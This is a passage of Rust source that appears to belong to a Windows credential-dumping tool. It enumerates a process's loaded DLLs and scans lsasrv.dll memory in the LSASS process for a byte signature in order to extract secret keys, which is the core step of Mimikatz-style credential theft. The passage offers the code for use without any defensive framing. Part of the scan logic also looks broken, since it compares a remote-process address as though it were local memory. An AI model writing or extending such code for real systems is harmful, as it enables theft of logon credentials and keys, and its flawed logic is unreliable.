                modules.resize(num_entries_needed, null_mut());
                modules
            } else {
                return format!("{}", Error::last_os_error());
            }
        };

        let mut bytes_fetched: DWORD = 0;
        let enum_dlls_process = EnumProcessModulesEx(process_handle, modules.as_mut_ptr(), (modules.len() * sizeof_hmodule) as u32, &mut bytes_fetched, 0x03);
        if enum_dlls_process != FALSE {
            let num_entries_fetched = bytes_fetched as usize / sizeof_hmodule;
            modules.resize(num_entries_fetched, null_mut());
            let mut dll_names = String::new();

            for module in modules {
                const BUF_SIZE: usize = 1024;
                let mut buf = [0i8; BUF_SIZE];

                let dll_name = GetModuleFileNameExA(process_handle, module, buf.as_mut_ptr(), BUF_SIZE as u32);
                if dll_name != 0 {
                    
                    let buffer = std::mem::transmute::<[i8; 1024], [u8; 1024]>(buf);
                    
                    let buffer_handled = match std::str::from_utf8(&buffer) {
                        Ok(buffer_handled) => buffer_handled,
                        Err(_) => continue,
                    };

                    dll_names.push_str(&format!("{}:::{}\n", buffer_handled, format!("{:?}", module).replace("0x", "0000").to_uppercase()).to_owned());

                } else {
                    return format!("{}", Error::last_os_error());
                }
            }

            return dll_names;
        } else {
            return format!("{}", Error::last_os_error());
        }
    }
}

fn search_pattern(memory_location: usize, signature_location: usize, signaturelen: usize, signature: &[u8], process_handle: HANDLE) -> usize {
    unsafe {
        let signature_0 = get_single_byte(process_handle, signature_location);      //Gets the first byte of the signature
        let signature_1 = get_single_byte(process_handle, signature_location + 1);  //Gets the second byte of the signature

        for i in 0..2097152 {   // Seach in lsasrv.dll space
            let first_byte = get_single_byte(process_handle, memory_location + i);          //Gets the first byte of the DLL with increments of the DLL byte size
            let second_byte = get_single_byte(process_handle, memory_location + i + 1);     //Adds one upon the first byte to see if the second signature can be found.

            if first_byte == signature_0 && second_byte == signature_1 {
                let mem_loc = memsec::memcmp((memory_location + i) as *const u8, signature.as_ptr(), signaturelen);
                if mem_loc == 0 {
                    return i as usize;
                }
            }
        }
    }
    return 0; // return 0 if keys could not be extracted.
}
